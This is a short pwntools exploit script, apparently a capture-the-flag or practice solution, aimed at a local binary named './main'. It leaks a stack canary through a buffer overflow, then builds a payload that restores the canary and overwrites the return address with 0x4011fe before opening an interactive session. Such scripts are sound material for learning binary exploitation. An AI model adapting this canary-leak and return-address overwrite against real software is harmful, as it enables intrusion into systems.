from pwn import *

p: process = gdb.debug("./main", gdbscript="b* main")

# p.sendline(cyclic(100))


buffer = cyclic_find(0x6161617461616173)
p.sendline(b"a" * buffer)

p.recvline()
p.recvline()

leak = p.recv(7)
canary = b"\x00" + leak

payload = b"a" * buffer
payload += canary
payload += b"a" * 8
payload += p64(0x4011fe)

p.sendline(b"n")
p.sendline(payload)
p.sendline(b"y")


p.interactive()